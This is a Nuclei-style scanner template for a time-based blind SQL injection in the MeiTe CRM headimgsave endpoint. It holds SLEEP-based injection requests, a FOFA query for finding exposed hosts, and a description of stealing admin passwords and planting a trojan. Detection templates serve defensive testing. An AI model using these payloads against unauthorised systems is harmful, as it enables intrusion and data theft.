http:
    - matchers:
        - dsl:
            - status_code == 200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9
          name: SQL注入
          type: dsl
      raw:
        - |
          GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(4))x)--+ HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(8))x)--+ HTTP/1.1
          Host: {{Hostname}}
id: MeiTe-CRM-headimgsave-SQL
info:
    author: HuanXiong
    description: |-
        fofa: body="/common/scripts/basic.js"
        美特 CRM headimgsave 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 美特 CRM headimgsave SQL注入
    reference:
        - null
    severity: high
    tags: []
